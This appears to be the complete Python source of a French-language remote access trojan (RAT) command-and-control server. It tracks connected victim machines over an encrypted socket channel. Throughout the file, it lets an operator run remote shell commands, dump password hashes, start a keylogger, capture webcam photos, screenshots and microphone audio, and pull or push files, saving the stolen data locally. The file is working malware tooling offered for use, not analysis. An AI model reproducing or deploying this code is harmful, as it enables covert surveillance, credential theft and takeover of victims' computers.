import socket
import threading
import time
import json
import base64
import os
import queue
from cryptography.fernet import Fernet

class WorkingServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.clients = {}  # id: {"socket": sock, "info": {...}, "last_seen": time, "response_queue": queue}
        self.client_counter = 0
        self.running = False
        
        self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
        self.cipher = Fernet(self.key)
        
    def start(self):
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            print(f"[*] Serveur démarré sur {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    self.client_counter += 1
                    client_id = self.client_counter
                    
                    print(f"[+] Agent connecté depuis {addr[0]}:{addr[1]} (ID: {client_id})")
                    
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_sock, client_id, addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        print("[-] Erreur socket")
                        
        except Exception as e:
            print(f"[-] Erreur serveur: {e}")
        finally:
            self.stop()
    
    def _handle_client(self, client_sock, client_id, addr):
        """Gère un client - AVEC QUEUE comme ton ami"""
        try:
            # Ajoute le client avec une queue pour les réponses
            response_queue = queue.Queue()
            self.clients[client_id] = {
                "socket": client_sock,
                "addr": addr,
                "info": {},
                "last_seen": time.time(),
                "response_queue": response_queue
            }
            
            # Reçoit les infos initiales
            client_sock.settimeout(10)
            initial_data = self._receive_full_message(client_sock)
            if initial_data:
                try:
                    decrypted = self.cipher.decrypt(initial_data)
                    client_info = json.loads(decrypted.decode('utf-8'))
                    self.clients[client_id]["info"] = client_info
                    print(f"[*] Client {client_id} info: {client_info.get('hostname', 'Unknown')}")
                    
                    # Envoie confirmation
                    response = {'status': 'connected', 'client_id': client_id}
                    self._send_message(client_sock, response)
                except Exception as e:
                    print(f"[-] Erreur handshake: {e}")
                    return
            
            # Boucle principale - COMME TON AMI
            client_sock.settimeout(35)
            while self.running and client_id in self.clients:
                try:
                    data = self._receive_full_message(client_sock)
                    if not data:
                        print(f"[DEBUG] Client {client_id} déconnecté")
                        break
                    
                    # Déchiffre le message
                    decrypted = self.cipher.decrypt(data)
                    message = json.loads(decrypted.decode('utf-8'))
                    
                    self.clients[client_id]["last_seen"] = time.time()
                    
                    if message.get("type") == "heartbeat":
                        # Heartbeat - répond directement
                        response = {"type": "heartbeat_ack"}
                        self._send_message(client_sock, response)
                        print(f"[DEBUG] Heartbeat de client {client_id}")
                    else:
                        # Réponse à une commande - met dans la queue
                        print(f"[DEBUG] Réponse de client {client_id}")
                        response_queue.put(message)
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[DEBUG] Client {client_id} erreur: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Erreur client {client_id}: {e}")
        finally:
            self._cleanup_client(client_id)
    
    def _receive_full_message(self, sock):
        """Reçoit un message complet - ROBUSTE pour gros messages"""
        try:
            # D'abord reçoit la taille du message (4 bytes)
            size_data = b''
            while len(size_data) < 4:
                chunk = sock.recv(4 - len(size_data))
                if not chunk:
                    return None
                size_data += chunk
            
            # Décode la taille
            message_size = int.from_bytes(size_data, 'big')
            
            # Limite pour sécurité
            if message_size > 50 * 1024 * 1024:  # 50MB max
                print(f"[WARNING] Message trop gros: {message_size}")
                return None
            
            # Reçoit le message complet
            message_data = b''
            while len(message_data) < message_size:
                chunk_size = min(4096, message_size - len(message_data))
                chunk = sock.recv(chunk_size)
                if not chunk:
                    return None
                message_data += chunk
            
            return message_data
            
        except Exception as e:
            print(f"[DEBUG] Erreur réception: {e}")
            return None
    
    def _send_message(self, sock, message):
        """Envoie un message avec taille - ROBUSTE"""
        try:
            # Sérialise et chiffre
            json_data = json.dumps(message)
            encrypted_data = self.cipher.encrypt(json_data.encode('utf-8'))
            
            # Envoie la taille d'abord (4 bytes)
            size_bytes = len(encrypted_data).to_bytes(4, 'big')
            sock.sendall(size_bytes)
            
            # Puis les données
            sock.sendall(encrypted_data)
            return True
            
        except Exception as e:
            print(f"[DEBUG] Erreur envoi: {e}")
            return False
    
    def send_command(self, client_id, command, args=None):
        """Envoie une commande - AVEC QUEUE comme ton ami"""
        if client_id not in self.clients:
            return {"error": "Client non trouvé"}
        
        client_info = self.clients[client_id]
        client_sock = client_info["socket"]
        response_queue = client_info["response_queue"]
        
        try:
            # Vide la queue avant d'envoyer
            while not response_queue.empty():
                try:
                    response_queue.get_nowait()
                except queue.Empty:
                    break
            
            # Prépare la commande
            command_data = {
                "type": "command", 
                "command": command,
                "args": args or [],
                "timestamp": time.time()
            }
            
            # Envoie la commande
            print(f"[DEBUG] Envoi commande à client {client_id}: {command}")
            if not self._send_message(client_sock, command_data):
                self._cleanup_client(client_id)
                return {"error": "Échec d'envoi"}
            
            # Attend la réponse via la queue - TIMEOUT LONG pour screenshot
            timeout = 60 if command == "screenshot" else 30
            try:
                response = response_queue.get(timeout=timeout)
                print(f"[DEBUG] Réponse reçue de client {client_id}")
                return response
            except queue.Empty:
                return {"error": f"Timeout commande ({timeout}s)"}
                
        except Exception as e:
            self._cleanup_client(client_id)
            return {"error": f"Erreur commande: {e}"}
    
    def _cleanup_client(self, client_id):
        """Nettoie un client"""
        if client_id in self.clients:
            try:
                self.clients[client_id]["socket"].close()
            except:
                pass
            try:
                del self.clients[client_id]
                print(f"[-] Client {client_id} déconnecté")
            except KeyError:
                pass
    
    def list_clients(self):
        """Liste les clients connectés"""
        return {
            client_id: {
                "addr": info["addr"],
                "info": info["info"],
                "last_seen": info["last_seen"]
            }
            for client_id, info in self.clients.items()
        }
    
    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except:
            pass

class ServerInterface:
    def __init__(self):
        self.server = None
        self.current_client = None
        
    def start(self, host="0.0.0.0", port=4444):
        self.server = WorkingServer(host, port)
        
        server_thread = threading.Thread(target=self.server.start, daemon=True)
        server_thread.start()
        
        time.sleep(1)
        self.run_interface()
    
    def run_interface(self):
        print("\n" + "="*60)
        print("🎯 RAT SERVER - ARCHITECTURE ROBUSTE")
        print("="*60)
        print("Tapez 'help' pour voir les commandes disponibles")
        
        while True:
            try:
                if self.current_client:
                    prompt = f"rat agent{self.current_client} > "
                else:
                    prompt = "rat > "
                
                user_input = input(prompt).strip()
                
                if not user_input:
                    continue
                
                if self.current_client:
                    self.handle_agent_command(user_input)
                else:
                    self.handle_main_command(user_input)
                    
            except KeyboardInterrupt:
                print("\n[*] Arrêt du serveur...")
                if self.server:
                    self.server.stop()
                break
            except EOFError:
                break
    
    def handle_main_command(self, command):
        parts = command.split()
        cmd = parts[0].lower()
        
        if cmd == "help":
            self.show_main_help()
        elif cmd == "sessions":
            self.list_sessions()
        elif cmd == "interact":
            if len(parts) > 1:
                try:
                    client_id = int(parts[1])
                    self.interact_with_client(client_id)
                except ValueError:
                    print("[-] ID client invalide")
            else:
                print("[-] Usage: interact <client_id>")
        elif cmd in ["exit", "quit"]:
            if self.server:
                self.server.stop()
            exit(0)
        else:
            print(f"[-] Commande inconnue: {cmd}")
    
    def handle_agent_command(self, command):
        parts = command.split()
        cmd = parts[0].lower()
        
        if cmd == "back":
            self.current_client = None
            return
        elif cmd == "help":
            self.show_agent_help()
            return
        
        if self.current_client not in self.server.clients:
            print(f"[-] Agent {self.current_client} n'est plus connecté")
            self.current_client = None
            return
        
        # TRAITEMENT SPÉCIAL POUR UPLOAD - CORRECTION COMPLÈTE
        if cmd == "upload":
            if len(parts) < 3:
                print("[-] Usage: upload <chemin_destination_sur_client> <fichier_local_serveur>")
                print("[-] Exemple: upload C:\\Users\\target\\Desktop\\monfichier.txt ./monfichier_local.txt")
                return
                
            dest_path = parts[1]
            local_file_path = parts[2]
            
            # Vérifie que le fichier local existe
            if not os.path.exists(local_file_path):
                print(f"[-] Fichier local inexistant: {local_file_path}")
                return
                
            if not os.path.isfile(local_file_path):
                print(f"[-] N'est pas un fichier: {local_file_path}")
                return
                
            # Vérifie la taille
            file_size = os.path.getsize(local_file_path)
            if file_size > 50 * 1024 * 1024:  # 50MB
                print(f"[-] Fichier trop volumineux: {file_size} bytes")
                return
                
            try:
                # Lit et encode le fichier local
                print(f"[*] Lecture du fichier local: {local_file_path}")
                with open(local_file_path, "rb") as f:
                    file_data = f.read()
                
                file_data_b64 = base64.b64encode(file_data).decode()
                
                print(f"[*] Upload de '{local_file_path}' vers '{dest_path}' ({file_size} bytes)...")
                print(f"[DEBUG] Données encodées: {len(file_data_b64)} caractères base64")
                
                # Envoie la commande avec les données encodées
                args = [dest_path, file_data_b64]
                result = self.server.send_command(self.current_client, cmd, args)
                
                if "error" in result:
                    print(f"[-] Erreur: {result['error']}")
                    if "timeout" in result['error'].lower() or "déconnecté" in result['error'].lower():
                        self.current_client = None
                else:
                    self.display_result(cmd, result)
                    
            except Exception as e:
                print(f"[-] Erreur lecture fichier local: {e}")
                import traceback
                traceback.print_exc()
            
            return
        
        # TRAITEMENT NORMAL POUR LES AUTRES COMMANDES
        args = parts[1:] if len(parts) > 1 else []
        print(f"[*] Exécution de '{cmd}'...")
        result = self.server.send_command(self.current_client, cmd, args)
        
        if "error" in result:
            print(f"[-] Erreur: {result['error']}")
            if "timeout" in result['error'].lower() or "déconnecté" in result['error'].lower():
                self.current_client = None
        else:
            self.display_result(cmd, result)
    
    def display_result(self, command, result):
        # DEBUG: Affichage des clés pour diagnostic
        print(f"[DEBUG] Commande: {command}")
        print(f"[DEBUG] Clés dans result: {list(result.keys()) if isinstance(result, dict) else type(result)}")
        
        if command == "screenshot":
            if 'image_data' in result:
                filename = f"screenshot_{self.current_client}_{int(time.time())}.png"
                try:
                    image_data = base64.b64decode(result['image_data'])
                    with open(filename, 'wb') as f:
                        f.write(image_data)
                    print(f"[+] Capture sauvée: {filename}")
                    print(f"[+] Chemin complet: {os.path.abspath(filename)}")
                except Exception as e:
                    print(f"[-] Erreur sauvegarde: {e}")
            else:
                print(result.get('output', str(result)))
        
        elif command == "webcam_snapshot":
            print(f"[DEBUG] Traitement webcam_snapshot")
            if 'image_data' in result:
                filename = f"webcam_{self.current_client}_{int(time.time())}.jpg"
                try:
                    image_data = base64.b64decode(result['image_data'])
                    with open(filename, 'wb') as f:
                        f.write(image_data)
                    print(f"[+] Photo webcam sauvée: {filename}")
                    print(f"[+] Chemin complet: {os.path.abspath(filename)}")
                    print(f"[+] Taille: {len(image_data)} bytes")
                except Exception as e:
                    print(f"[-] Erreur sauvegarde webcam: {e}")
                    import traceback
                    traceback.print_exc()
            else:
                print(f"[DEBUG] 'image_data' non trouvé dans result")
                print(result.get('output', str(result)))
        
        elif command == "keylogger":
            # NOUVEAU: Sauvegarde automatique du keylogger
            output_text = result.get('output', '')
            print(output_text)  # Affiche d'abord le résultat
            
            # Vérifie si c'est un arrêt de keylogger avec des données
            if 'arrêté' in output_text and 'touches capturées' in output_text and '--- DÉBUT KEYLOG ---' in output_text:
                try:
                    # Extrait les données du keylog
                    start_marker = '--- DÉBUT KEYLOG ---\n'
                    end_marker = '\n--- FIN KEYLOG ---'
                    
                    start_idx = output_text.find(start_marker)
                    end_idx = output_text.find(end_marker)
                    
                    if start_idx != -1 and end_idx != -1:
                        # Extrait le contenu du keylog
                        keylog_content = output_text[start_idx + len(start_marker):end_idx]
                        
                        # Nom du fichier avec timestamp
                        filename = f"keylog_{self.current_client}_{int(time.time())}.txt"
                        
                        # Crée un contenu formaté pour le fichier
                        file_content = f"""=== KEYLOGGER DATA ===
Client ID: {self.current_client}
Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}
Agent Info: {self.server.clients.get(self.current_client, {}).get('info', {}).get('hostname', 'Unknown')}

=== RAW KEYLOG DATA ===
{keylog_content}

=== FORMATTED KEYLOG DATA ===
{keylog_content.replace('[space]', ' ').replace('[backspace]', '<BACKSPACE>').replace('[enter]', '<ENTER>').replace('[tab]', '<TAB>')}

=== END OF KEYLOG ===
"""
                        
                        # Sauvegarde le fichier
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(file_content)
                        
                        print(f"[+] Keylog sauvé: {filename}")
                        print(f"[+] Chemin complet: {os.path.abspath(filename)}")
                        print(f"[+] Données nettoyées: {len(keylog_content)} caractères")
                        
                        # Affiche un aperçu des données nettoyées
                        clean_data = keylog_content.replace('[space]', ' ').replace('[backspace]', '<BS>').replace('[enter]', '<ENTER>')
                        if len(clean_data) > 100:
                            preview = clean_data[:100] + "..."
                        else:
                            preview = clean_data
                        print(f"[+] Aperçu: {preview}")
                        
                except Exception as e:
                    print(f"[-] Erreur sauvegarde keylog: {e}")
                    import traceback
                    traceback.print_exc()
        
        elif command == "record_audio":
            print(f"[DEBUG] Traitement record_audio")
            if 'audio_data' in result:
                filename = f"audio_{self.current_client}_{int(time.time())}.wav"
                try:
                    audio_data = base64.b64decode(result['audio_data'])
                    with open(filename, 'wb') as f:
                        f.write(audio_data)
                    print(f"[+] Audio sauvé: {filename}")
                    print(f"[+] Chemin complet: {os.path.abspath(filename)}")
                    print(f"[+] Taille: {len(audio_data)} bytes")
                except Exception as e:
                    print(f"[-] Erreur sauvegarde audio: {e}")
                    import traceback
                    traceback.print_exc()
            else:
                print(f"[DEBUG] 'audio_data' non trouvé dans result")
                print(result.get('output', str(result)))
        
        elif command == "download":
            print(f"[DEBUG] Traitement download")
            if 'file_data' in result:
                filename = result.get('filename', f"download_{int(time.time())}")
                safe_filename = f"client_{self.current_client}_{filename}"
                try:
                    print(f"[DEBUG] Décodage de {len(result['file_data'])} caractères base64...")
                    file_data = base64.b64decode(result['file_data'])
                    print(f"[DEBUG] Données décodées: {len(file_data)} bytes")
                    
                    with open(safe_filename, 'wb') as f:
                        f.write(file_data)
                    
                    # VÉRIFICATION que le fichier existe bien
                    if os.path.exists(safe_filename):
                        actual_size = os.path.getsize(safe_filename)
                        print(f"[+] Fichier téléchargé: {safe_filename}")
                        print(f"[+] Chemin complet: {os.path.abspath(safe_filename)}")
                        print(f"[+] Taille sur disque: {actual_size} bytes")
                        
                        # Vérification de l'intégrité
                        if actual_size == len(file_data):
                            print(f"[+] ✅ Fichier téléchargé avec succès!")
                        else:
                            print(f"[!] ⚠️ Taille différente - attendu: {len(file_data)}, écrit: {actual_size}")
                    else:
                        print(f"[-] ❌ ERREUR: Le fichier n'a pas été créé!")
                        
                except Exception as e:
                    print(f"[-] Erreur téléchargement: {e}")
                    import traceback
                    traceback.print_exc()
            else:
                print(f"[DEBUG] 'file_data' non trouvé dans result")
                print(result.get('output', str(result)))
        
        elif command == "upload":
            # AFFICHAGE AMÉLIORÉ POUR UPLOAD
            print(f"[DEBUG] Traitement upload")
            if 'output' in result:
                output_text = result['output']
                print(output_text)
                
                # Si c'est un succès, affiche des infos supplémentaires
                if "uploadé" in output_text.lower() or "uploaded" in output_text.lower():
                    print(f"[+] ✅ Upload réussi!")
                else:
                    print(f"[!] ⚠️ Vérifiez le résultat ci-dessus")
            else:
                print(str(result))
        
        else:
            if 'output' in result:
                print(result['output'])
            else:
                print(str(result))
    
    def list_sessions(self):
        clients = self.server.list_clients()
        
        if not clients:
            print("[*] Aucune session active")
            return
        
        print(f"\n[*] Sessions actives ({len(clients)}):")
        print("-" * 70)
        print(f"{'ID':<4} {'Hostname':<15} {'User':<12} {'OS':<10} {'IP':<15}")
        print("-" * 70)
        
        for client_id, info in clients.items():
            client_info = info['info']
            
            print(f"{client_id:<4} "
                  f"{client_info.get('hostname', 'N/A')[:15]:<15} "
                  f"{client_info.get('username', 'N/A')[:12]:<12} "
                  f"{client_info.get('os', 'N/A')[:10]:<10} "
                  f"{info['addr'][0]:<15}")
    
    def interact_with_client(self, client_id):
        if client_id in self.server.clients:
            self.current_client = client_id
            client_info = self.server.clients[client_id]['info']
            print(f"[*] Interaction avec l'agent {client_id}")
            print(f"    Hostname: {client_info.get('hostname', 'N/A')}")
            print(f"    OS: {client_info.get('os', 'N/A')}")
            print(f"    User: {client_info.get('username', 'N/A')}")
        else:
            print(f"[-] Agent {client_id} non trouvé")
    
    def show_main_help(self):
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    COMMANDES PRINCIPALES                     ║
╠══════════════════════════════════════════════════════════════╣
║ sessions          - Liste les sessions actives              ║
║ interact <id>     - Interagit avec une session              ║
║ help              - Affiche cette aide                      ║
║ exit/quit         - Quitte le serveur                       ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    def show_agent_help(self):
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    COMMANDES D'AGENT                        ║
╠══════════════════════════════════════════════════════════════╣
║ help              - Affiche cette aide                      ║
║ ipconfig          - Configuration réseau                    ║
║ screenshot        - Capture d'écran                         ║
║ shell <cmd>       - Exécute une commande shell              ║
║ download <file>   - Télécharge un fichier                   ║
║ upload <dest> <local> - Upload fichier local vers client    ║
║ search <pattern>  - Recherche de fichiers                   ║
║ hashdump          - Dump des hash                           ║
║ keylogger start/stop - Contrôle du keylogger                ║
║ webcam_snapshot   - Photo webcam                            ║
║ record_audio <sec> - Enregistrement audio                   ║
║ back              - Retour au menu principal                ║
╚══════════════════════════════════════════════════════════════╝
        """)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Serveur RAT robuste")
    parser.add_argument("--host", default="0.0.0.0", help="Adresse d'écoute")
    parser.add_argument("--port", type=int, default=4444, help="Port d'écoute")
    
    args = parser.parse_args()
    
    interface = ServerInterface()
    interface.start(args.host, args.port)

if __name__ == "__main__":
    main()
